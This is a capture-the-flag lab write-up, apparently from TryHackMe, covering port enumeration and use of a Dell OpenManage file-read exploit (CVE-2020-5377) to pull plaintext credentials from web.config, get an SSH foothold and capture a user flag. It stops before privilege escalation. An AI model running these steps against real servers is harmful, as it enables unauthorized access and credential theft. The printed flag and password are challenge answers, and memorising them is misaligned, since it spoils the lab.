🎯 Project Objective

The goal of this project was to gain unauthorized access to a server operated by the HackSmarterSec group, followed by privilege escalation to SYSTEM level and extraction of sensitive data (flags and a list of future targets).

The engagement focused heavily on proper enumeration, identifying non-standard services, and exploiting a real-world vulnerability in Dell OpenManage Server Administrator.

🧭 Phase 1. Enumeration
🔍 Nmap Scanning

The first step was to perform a full port and service scan against the target machine:

nmap -Pn -sC -sV -p- 10.81.151.53

📌 Discovered Open Ports:
Port	Service	Description
21	FTP	Anonymous access enabled
22	SSH	Remote login
80	HTTP	IIS Web Server
1311	HTTPS	Dell OpenManage
3389	RDP	Remote Desktop
🌐 Phase 2. Service Analysis
FTP (21)

Anonymous login was allowed

Discovered files:

Credit-Cards-We-Pawned.txt

stolen-passport.png

File analysis (including EXIF metadata) revealed no useful information
➡ Considered a dead end

HTTP (80)

Server identified as Microsoft IIS

A contact form was discovered

Basic XSS payloads were tested but no exploitation was possible

No critical vulnerabilities found

🔐 HTTPS (1311) — Primary Attack Vector

Upon inspecting port 1311, the following service was identified:

Dell EMC OpenManage Server Administrator
Version: 9.4.0.2


Accessed via:

https://<target-ip>:1311


This exposed the OpenManage web login portal.

🧨 Phase 3. Vulnerability Discovery & Exploitation
🔎 Version Fingerprinting

OMSA Version: 9.4.0.2

Apache Tomcat 9.0.21

Java Runtime Environment 11.0.7

🐞 Identified Vulnerability

CVE-2020-5377 – Arbitrary File Read

This vulnerability allows unauthenticated arbitrary file reading on vulnerable versions of Dell OpenManage Server Administrator.

⚙️ Exploiting CVE-2020-5377

The exploitation was performed using a Python PoC:

python3 CVE-2020-5377.py <ATTACKER_IP> <TARGET_IP>:1311

📂 Successfully Retrieved Files:
1️⃣ Proof of File Read:
C:\Windows\win.ini


✔ Successfully accessed

2️⃣ Sensitive Configuration File:
C:\inetpub\wwwroot\hacksmartersec\web.config


📄 Contents:

<add key="Username" value="tyler" />
<add key="Password" value="IAmA1337h4x0randIkn0wit!" />

🚪 Phase 4. Initial Foothold

The extracted credentials were used to establish an SSH session:

ssh tyler@hacksmarter.thm


Successful login was achieved as user tyler.

👤 Phase 5. User Flag

The user flag was located on the desktop:

C:\Users\tyler\Desktop\user.txt


📌 user.txt

THM{4ll15n0tw3llw1thd3ll}

🔼 Phase 6. Privilege Escalation Preparation

User tyler has limited privileges

systeminfo returned Access Denied

Windows Defender was active

Enumeration for privilege escalation began using PrivescCheck.ps1

A misconfigured service running as SYSTEM was identified (next phase)

🧠 Current Outcome

✔ Full enumeration completed
✔ Non-standard service identified (port 1311)
✔ Real-world CVE successfully exploited
✔ Initial foothold obtained
✔ User flag captured
➡ System fully prepared for privilege escalation to SYSTEM
